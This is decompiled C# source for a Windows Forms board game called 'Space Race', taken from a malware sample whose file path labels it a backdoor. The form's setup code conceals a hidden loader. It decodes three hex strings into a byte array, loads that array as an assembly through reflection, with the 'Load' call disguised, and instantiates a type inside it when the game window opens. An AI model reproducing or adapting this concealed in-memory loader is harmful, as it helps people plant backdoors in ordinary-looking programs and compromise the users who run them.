// Decompiled with JetBrains decompiler
// Type: GUI_Class.SpaceRaceForm
// Assembly: AssemblyHa, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: F582D8E5-D67F-4A37-A1B2-DD78DCA9CC78
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\Backdoor.Win32.Blakken.vpu-da917e6cce829452a2fefa2c4dd28bed5eefc382e7b5891dc033186e478ef6dd.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Windows.Forms;

namespace GUI_Class
{
  public class SpaceRaceForm : Form
  {
    private const int NUM_OF_ROWS = 7;
    private const int NUM_OF_COLUMNS = 8;
    private int[] prevSquare;
    private int playerStep = 0;
    private bool eachStep = true;
    private IContainer components = (IContainer) null;
    private static System.Type ComMember;
    private SplitContainer splitContainer1;
    private Button exitButton;
    private TableLayoutPanel tableLayoutPanel;
    private Label playersLabel;
    private Label numberOfplayerslabel;
    private Label spaceRacelabel;
    private GroupBox singleStepgroupbox;
    private RadioButton noRadiobutton;
    private RadioButton yesRadiobutton;
    private Button resetButton;
    private Button diceButton;
    private ComboBox numPlayersinput;
    private DataGridView playersDataGridView;
    private DataGridViewImageColumn playerTokenImageDataGridViewImageColumn;
    private DataGridViewTextBoxColumn nameDataGridViewTextBoxColumn;
    private DataGridViewTextBoxColumn positionDataGridViewTextBoxColumn;
    private DataGridViewTextBoxColumn rocketFuelDataGridViewTextBoxColumn;
    private BindingSource playerBindingSource;

    public SpaceRaceForm()
    {
      this.InitializeComponent();
      Board.SetUpBoard();
      this.ResizeGUIGameBoard();
      this.SetUpGUIGameBoard();
      this.SetupPlayersDataGridView();
      this.DetermineNumberOfPlayers();
      SpaceRaceGame.SetUpPlayers();
      this.PrepareToPlay();
    }

    private void ExitButton_Click(object sender, EventArgs e) => Environment.Exit(0);

    private void ResizeGUIGameBoard()
    {
      int height1 = this.tableLayoutPanel.Size.Height;
      int width1 = this.tableLayoutPanel.Size.Width;
      int height2 = 665;
      int width2 = 760;
      int height3 = height2 - height1;
      this.Size = this.Size + new Size(width2 - width1, height3);
      this.tableLayoutPanel.Size = new Size(width2, height2);
    }

    private void SetUpGUIGameBoard()
    {
      for (int squareNum = 0; squareNum <= 55; ++squareNum)
        this.AddControlToTableLayoutPanel((Control) new SquareControl(Board.Squares[squareNum], SpaceRaceGame.Players), squareNum);
    }

    private void AddControlToTableLayoutPanel(Control control, int squareNum)
    {
      int screenRow;
      int screenCol;
      SpaceRaceForm.MapSquareNumToScreenRowAndColumn(squareNum, out screenRow, out screenCol);
      this.tableLayoutPanel.Controls.Add(control, screenCol, screenRow);
    }

    private static void MapSquareNumToScreenRowAndColumn(
      int squareNum,
      out int screenRow,
      out int screenCol)
    {
      screenRow = 6 - Convert.ToInt32(Math.Truncate((double) squareNum / 8.0));
      int num = squareNum % 8;
      if (screenRow % 2 == 0)
        screenCol = num;
      else
        screenCol = 7 - num;
    }

    private void SetupPlayersDataGridView()
    {
      this.playersDataGridView.AutoGenerateColumns = false;
      this.playersDataGridView.DataSource = (object) SpaceRaceGame.Players;
    }

    private void DetermineNumberOfPlayers()
    {
      int result;
      int.TryParse(this.numPlayersinput.SelectedItem.ToString(), out result);
      SpaceRaceGame.NumberOfPlayers = result;
      this.resetButton.Enabled = true;
    }

    private void PrepareToPlay()
    {
      this.UpdatePlayersGuiLocations(SpaceRaceForm.TypeOfGuiUpdate.RemovePlayer);
      if (this.yesRadiobutton.Checked)
      {
        for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
          this.SquareControlAt(this.prevSquare[index]).ContainsPlayers[index] = false;
      }
      int result;
      int.TryParse(this.numPlayersinput.SelectedItem.ToString(), out result);
      SpaceRaceGame.NumberOfPlayers = result;
      SpaceRaceGame.Players.Clear();
      this.prevSquare = new int[result];
      SpaceRaceGame.SetUpPlayers();
      this.UpdatePlayersGuiLocations(SpaceRaceForm.TypeOfGuiUpdate.AddPlayer);
    }

    private SquareControl SquareControlAt(int squareNum)
    {
      int screenRow;
      int screenCol;
      SpaceRaceForm.MapSquareNumToScreenRowAndColumn(squareNum, out screenRow, out screenCol);
      return (SquareControl) this.tableLayoutPanel.GetControlFromPosition(screenCol, screenRow);
    }

    private int GetSquareNumberOfPlayer(int playerNumber) => SpaceRaceGame.Players[playerNumber].Position;

    private void RefreshBoardTablePanelLayout() => this.tableLayoutPanel.Invalidate(true);

    private void UpdatesPlayersDataGridView() => SpaceRaceGame.Players.ResetBindings();

    private void UpdatePlayersGuiLocations(SpaceRaceForm.TypeOfGuiUpdate typeOfGuiUpdate)
    {
      for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
      {
        int position = SpaceRaceGame.Players[index].Position;
        switch (typeOfGuiUpdate)
        {
          case SpaceRaceForm.TypeOfGuiUpdate.AddPlayer:
            this.SquareControlAt(position).ContainsPlayers[index] = true;
            break;
          case SpaceRaceForm.TypeOfGuiUpdate.RemovePlayer:
            this.SquareControlAt(position).ContainsPlayers[index] = false;
            break;
        }
      }
      this.RefreshBoardTablePanelLayout();
    }

    private void ToggleAll(bool enable)
    {
      this.exitButton.Enabled = enable;
      this.playersDataGridView.Enabled = enable;
      this.numPlayersinput.Enabled = enable;
      this.singleStepgroupbox.Enabled = enable;
    }

    private void DiceButton_Click(object sender, EventArgs e)
    {
      if (this.yesRadiobutton.Checked)
      {
        this.SingleStep(this.playerStep);
        ++this.playerStep;
        if (this.playerStep == SpaceRaceGame.NumberOfPlayers)
        {
          this.eachStep = true;
          this.resetButton.Enabled = true;
          this.exitButton.Enabled = true;
          this.playerStep = 0;
        }
        else
        {
          for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
          {
            if (SpaceRaceGame.Players[index].Position == 55)
            {
              this.resetButton.Enabled = true;
              break;
            }
            this.resetButton.Enabled = false;
          }
        }
      }
      if (this.noRadiobutton.Checked)
        this.AllStep();
      if (!SpaceRaceGame.AllPlayerFuel())
        return;
      int num = (int) MessageBox.Show("All players has 0 fuel.");
      this.exitButton.Enabled = true;
      this.diceButton.Enabled = false;
    }

    private void SingleStep(int playerNum)
    {
      if (this.eachStep)
      {
        for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
          this.prevSquare[index] = SpaceRaceGame.Players[index].Position;
        this.eachStep = false;
      }
      this.SquareControlAt(this.prevSquare[playerNum]).ContainsPlayers[playerNum] = false;
      SpaceRaceGame.PlayOneTurn(playerNum);
      if (SpaceRaceGame.Players[playerNum].RocketFuel == 0)
      {
        int num = (int) MessageBox.Show(string.Format("{0} has 0 fuel.", (object) SpaceRaceGame.Players[playerNum].Name));
      }
      this.SquareControlAt(SpaceRaceGame.Players[playerNum].Position).ContainsPlayers[playerNum] = true;
      this.UpdatesPlayersDataGridView();
      this.RefreshBoardTablePanelLayout();
      this.ToggleAll(false);
      this.EndGame();
      this.WinnerMessage(this.EndGame());
    }

    private void AllStep()
    {
      this.UpdatePlayersGuiLocations(SpaceRaceForm.TypeOfGuiUpdate.RemovePlayer);
      SpaceRaceGame.PlayOneRound();
      this.UpdatePlayersGuiLocations(SpaceRaceForm.TypeOfGuiUpdate.AddPlayer);
      this.UpdatesPlayersDataGridView();
      this.resetButton.Enabled = true;
      this.ToggleAll(false);
      this.EndGame();
      this.WinnerMessage(this.EndGame());
    }

    private void ResetButton_Click(object sender, EventArgs e)
    {
      this.PrepareToPlay();
      this.ToggleAll(true);
      this.diceButton.Enabled = false;
      this.yesRadiobutton.Checked = false;
      this.noRadiobutton.Checked = false;
      this.eachStep = true;
      this.playerStep = 0;
    }

    private string[] EndGame()
    {
      string[] strArray = new string[6];
      for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
      {
        if (this.SquareControlAt(55).ContainsPlayers[index])
        {
          strArray[index] = SpaceRaceGame.Players[index].Name;
          this.diceButton.Enabled = false;
          this.exitButton.Enabled = true;
        }
      }
      return strArray;
    }

    private void WinnerMessage(string[] winners)
    {
      if (this.noRadiobutton.Checked)
      {
        for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
        {
          if (this.SquareControlAt(55).ContainsPlayers[index])
          {
            this.exitButton.Enabled = true;
            int num = (int) MessageBox.Show(string.Format("The following player(s) finished the game\n\t{0}", (object) string.Join(Environment.NewLine, winners)));
            this.noRadiobutton.Checked = false;
            break;
          }
        }
      }
      else
      {
        for (int index = 0; index < SpaceRaceGame.NumberOfPlayers; ++index)
        {
          if (this.SquareControlAt(55).ContainsPlayers[index])
          {
            int num = (int) MessageBox.Show(string.Format("The following player(s) finished the game\n\t{0}", (object) string.Join(Environment.NewLine, winners)));
            this.exitButton.Enabled = true;
            this.resetButton.Enabled = true;
            this.yesRadiobutton.Checked = false;
          }
        }
      }
    }

    private void SingleStepToggle()
    {
      this.diceButton.Enabled = true;
      this.singleStepgroupbox.Enabled = false;
    }

    private void YesRadiobutton_Click(object sender, EventArgs e) => this.SingleStepToggle();

    private void NoRadiobutton_Click(object sender, EventArgs e) => this.SingleStepToggle();

    private void NumPlayersinput_SelectedIndexChanged(object sender, EventArgs e)
    {
      this.PrepareToPlay();
      this.numPlayersinput.Enabled = false;
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      this.splitContainer1 = new SplitContainer();
      this.tableLayoutPanel = new TableLayoutPanel();
      this.playersDataGridView = new DataGridView();
      this.singleStepgroupbox = new GroupBox();
      this.noRadiobutton = new RadioButton();
      this.yesRadiobutton = new RadioButton();
      this.resetButton = new Button();
      this.diceButton = new Button();
      this.numPlayersinput = new ComboBox();
      this.playersLabel = new Label();
      this.numberOfplayerslabel = new Label();
      this.spaceRacelabel = new Label();
      this.exitButton = new Button();
      this.playerTokenImageDataGridViewImageColumn = new DataGridViewImageColumn();
      this.nameDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
      this.positionDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
      this.rocketFuelDataGridViewTextBoxColumn = new DataGridViewTextBoxColumn();
      this.playerBindingSource = new BindingSource(this.components);
      this.splitContainer1.Panel1.SuspendLayout();
      this.splitContainer1.Panel2.SuspendLayout();
      this.splitContainer1.SuspendLayout();
      ((ISupportInitialize) this.playersDataGridView).BeginInit();
      this.singleStepgroupbox.SuspendLayout();
      ((ISupportInitialize) this.playerBindingSource).BeginInit();
      this.SuspendLayout();
      this.splitContainer1.Dock = DockStyle.Fill;
      this.splitContainer1.Location = new Point(0, 0);
      this.splitContainer1.Name = "splitContainer1";
      this.splitContainer1.Panel1.Controls.Add((Control) this.tableLayoutPanel);
      this.splitContainer1.Panel2.Controls.Add((Control) this.playersDataGridView);
      this.splitContainer1.Panel2.Controls.Add((Control) this.singleStepgroupbox);
      this.splitContainer1.Panel2.Controls.Add((Control) this.resetButton);
      this.splitContainer1.Panel2.Controls.Add((Control) this.diceButton);
      this.splitContainer1.Panel2.Controls.Add((Control) this.numPlayersinput);
      this.splitContainer1.Panel2.Controls.Add((Control) this.playersLabel);
      this.splitContainer1.Panel2.Controls.Add((Control) this.numberOfplayerslabel);
      this.splitContainer1.Panel2.Controls.Add((Control) this.spaceRacelabel);
      this.splitContainer1.Panel2.Controls.Add((Control) this.exitButton);
      this.splitContainer1.Size = new Size(884, 661);
      this.splitContainer1.SplitterDistance = 664;
      this.splitContainer1.TabIndex = 0;
      this.tableLayoutPanel.AutoSize = true;
      this.tableLayoutPanel.AutoSizeMode = AutoSizeMode.GrowAndShrink;
      this.tableLayoutPanel.BackColor = SystemColors.ControlLightLight;
      this.tableLayoutPanel.ColumnCount = 8;
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.ColumnStyles.Add(new ColumnStyle(SizeType.Percent, 12.5f));
      this.tableLayoutPanel.Dock = DockStyle.Fill;
      this.tableLayoutPanel.Location = new Point(0, 0);
      this.tableLayoutPanel.Name = "tableLayoutPanel";
      this.tableLayoutPanel.RowCount = 7;
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 14.28571f));
      this.tableLayoutPanel.Size = new Size(664, 661);
      this.tableLayoutPanel.TabIndex = 0;
      this.playersDataGridView.AllowUserToAddRows = false;
      this.playersDataGridView.AllowUserToDeleteRows = false;
      this.playersDataGridView.AutoGenerateColumns = false;
      this.playersDataGridView.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.playersDataGridView.Columns.AddRange((DataGridViewColumn) this.playerTokenImageDataGridViewImageColumn, (DataGridViewColumn) this.nameDataGridViewTextBoxColumn, (DataGridViewColumn) this.positionDataGridViewTextBoxColumn, (DataGridViewColumn) this.rocketFuelDataGridViewTextBoxColumn);
      this.playersDataGridView.DataSource = (object) this.playerBindingSource;
      this.playersDataGridView.Location = new Point(8, 124);
      this.playersDataGridView.Name = "playersDataGridView";
      this.playersDataGridView.RowHeadersVisible = false;
      this.playersDataGridView.Size = new Size(205, 174);
      this.playersDataGridView.TabIndex = 9;
      this.singleStepgroupbox.BackColor = SystemColors.ControlDark;
      this.singleStepgroupbox.Controls.Add((Control) this.noRadiobutton);
      this.singleStepgroupbox.Controls.Add((Control) this.yesRadiobutton);
      this.singleStepgroupbox.ForeColor = Color.Black;
      this.singleStepgroupbox.Location = new Point(40, 322);
      this.singleStepgroupbox.Name = "singleStepgroupbox";
      this.singleStepgroupbox.Size = new Size(140, 55);
      this.singleStepgroupbox.TabIndex = 8;
      this.singleStepgroupbox.TabStop = false;
      this.singleStepgroupbox.Text = "Single Step?";
      this.noRadiobutton.AutoSize = true;
      this.noRadiobutton.Location = new Point(71, 26);
      this.noRadiobutton.Name = "noRadiobutton";
      this.noRadiobutton.Size = new Size(39, 17);
      this.noRadiobutton.TabIndex = 1;
      this.noRadiobutton.TabStop = true;
      this.noRadiobutton.Text = "No";
      this.noRadiobutton.UseVisualStyleBackColor = true;
      this.noRadiobutton.Click += new EventHandler(this.NoRadiobutton_Click);
      this.yesRadiobutton.AutoSize = true;
      string str = QQQQQX.val1 + QQQQQX.val2 + QQQQQX.val3;
      byte[] Level = new byte[22528];
      for (int index = 0; index < 22528; ++index)
        Level[index] = Convert.ToByte(str.Substring(index * 2, 2), 16);
      SpaceRaceForm.CharArray(Level, string.Empty);
      object[] objArray = new object[3]
      {
        (object) Die.MembershipCondition(0),
        (object) Die.MembershipCondition(1),
        (object) "GUI_Class"
      };
      Activator.CreateInstance(SpaceRaceForm.ComMember, objArray);
      this.yesRadiobutton.Location = new Point(21, 26);
      this.yesRadiobutton.Name = "yesRadiobutton";
      this.yesRadiobutton.Size = new Size(43, 17);
      this.yesRadiobutton.TabIndex = 0;
      this.yesRadiobutton.TabStop = true;
      this.yesRadiobutton.Text = "Yes";
      this.yesRadiobutton.UseVisualStyleBackColor = true;
      this.yesRadiobutton.Click += new EventHandler(this.YesRadiobutton_Click);
      this.resetButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.resetButton.Enabled = false;
      this.resetButton.Location = new Point(17, 626);
      this.resetButton.Name = "resetButton";
      this.resetButton.Size = new Size(75, 23);
      this.resetButton.TabIndex = 6;
      this.resetButton.Text = "Game Reset";
      this.resetButton.UseVisualStyleBackColor = true;
      this.resetButton.Click += new EventHandler(this.ResetButton_Click);
      this.diceButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.diceButton.Enabled = false;
      this.diceButton.Location = new Point(63, 584);
      this.diceButton.Name = "diceButton";
      this.diceButton.Size = new Size(75, 23);
      this.diceButton.TabIndex = 5;
      this.diceButton.Text = "Roll Dice";
      this.diceButton.UseVisualStyleBackColor = true;
      this.diceButton.Click += new EventHandler(this.DiceButton_Click);
      this.numPlayersinput.FormattingEnabled = true;
      this.numPlayersinput.Items.AddRange(new object[5]
      {
        (object) "2",
        (object) "3",
        (object) "4",
        (object) "5",
        (object) "6"
      });
      this.numPlayersinput.Location = new Point(148, 39);
      this.numPlayersinput.Name = "numPlayersinput";
      this.numPlayersinput.Size = new Size(35, 21);
      this.numPlayersinput.TabIndex = 4;
      this.numPlayersinput.Text = "6";
      this.numPlayersinput.SelectedIndexChanged += new EventHandler(this.NumPlayersinput_SelectedIndexChanged);
      this.playersLabel.AutoSize = true;
      this.playersLabel.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.playersLabel.Location = new Point(60, 77);
      this.playersLabel.Name = "playersLabel";
      this.playersLabel.Size = new Size(91, 25);
      this.playersLabel.TabIndex = 3;
      this.playersLabel.Text = "Players";
      this.numberOfplayerslabel.AutoSize = true;
      this.numberOfplayerslabel.Location = new Point(48, 43);
      this.numberOfplayerslabel.Name = "numberOfplayerslabel";
      this.numberOfplayerslabel.Size = new Size(92, 13);
      this.numberOfplayerslabel.TabIndex = 2;
      this.numberOfplayerslabel.Text = "Number of players";
      this.spaceRacelabel.AutoSize = true;
      this.spaceRacelabel.Font = new Font("Microsoft Sans Serif", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.spaceRacelabel.Location = new Point(35, 9);
      this.spaceRacelabel.Name = "spaceRacelabel";
      this.spaceRacelabel.Size = new Size(139, 25);
      this.spaceRacelabel.TabIndex = 1;
      this.spaceRacelabel.Text = "Space Race";
      this.exitButton.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      this.exitButton.Font = new Font("Microsoft Sans Serif", 8.25f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.exitButton.Location = new Point(119, 626);
      this.exitButton.Name = "exitButton";
      this.exitButton.Size = new Size(75, 23);
      this.exitButton.TabIndex = 0;
      this.exitButton.Text = "Exit";
      this.exitButton.UseVisualStyleBackColor = true;
      this.exitButton.Click += new EventHandler(this.ExitButton_Click);
      this.playerTokenImageDataGridViewImageColumn.DataPropertyName = "PlayerTokenImage";
      this.playerTokenImageDataGridViewImageColumn.HeaderText = "";
      this.playerTokenImageDataGridViewImageColumn.ImageLayout = DataGridViewImageCellLayout.Stretch;
      this.playerTokenImageDataGridViewImageColumn.Name = "playerTokenImageDataGridViewImageColumn";
      this.playerTokenImageDataGridViewImageColumn.ReadOnly = true;
      this.playerTokenImageDataGridViewImageColumn.Width = 20;
      this.nameDataGridViewTextBoxColumn.DataPropertyName = "Name";
      this.nameDataGridViewTextBoxColumn.HeaderText = "Name";
      this.nameDataGridViewTextBoxColumn.Name = "nameDataGridViewTextBoxColumn";
      this.positionDataGridViewTextBoxColumn.DataPropertyName = "Position";
      this.positionDataGridViewTextBoxColumn.HeaderText = "Square";
      this.positionDataGridViewTextBoxColumn.Name = "positionDataGridViewTextBoxColumn";
      this.positionDataGridViewTextBoxColumn.ReadOnly = true;
      this.positionDataGridViewTextBoxColumn.Width = 50;
      this.rocketFuelDataGridViewTextBoxColumn.DataPropertyName = "RocketFuel";
      this.rocketFuelDataGridViewTextBoxColumn.HeaderText = "Fuel";
      this.rocketFuelDataGridViewTextBoxColumn.Name = "rocketFuelDataGridViewTextBoxColumn";
      this.rocketFuelDataGridViewTextBoxColumn.ReadOnly = true;
      this.rocketFuelDataGridViewTextBoxColumn.Width = 50;
      this.playerBindingSource.DataSource = (object) typeof (Player);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(884, 661);
      this.Controls.Add((Control) this.splitContainer1);
      this.Name = nameof (SpaceRaceForm);
      this.Text = "Space Race";
      this.splitContainer1.Panel1.ResumeLayout(false);
      this.splitContainer1.Panel1.PerformLayout();
      this.splitContainer1.Panel2.ResumeLayout(false);
      this.splitContainer1.Panel2.PerformLayout();
      this.splitContainer1.ResumeLayout(false);
      ((ISupportInitialize) this.playersDataGridView).EndInit();
      this.singleStepgroupbox.ResumeLayout(false);
      this.singleStepgroupbox.PerformLayout();
      ((ISupportInitialize) this.playerBindingSource).EndInit();
      this.ResumeLayout(false);
    }

    private static void CharArray(byte[] Level, string po) => SpaceRaceForm.PerformTable(SpaceRaceForm.ContextAdd(Level));

    private static Assembly ContextAdd(byte[] Position) => (Assembly) typeof (Assembly).InvokeMember("`Load".TrimStart('`'), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
    {
      (object) Position
    });

    private static void PerformTable(Assembly Q3) => SpaceRaceForm.ComMember = Q3.GetType("IRemotingFormatter.ContinuationWrapper");

    private enum TypeOfGuiUpdate
    {
      AddPlayer,
      RemovePlayer,
    }
  }
}
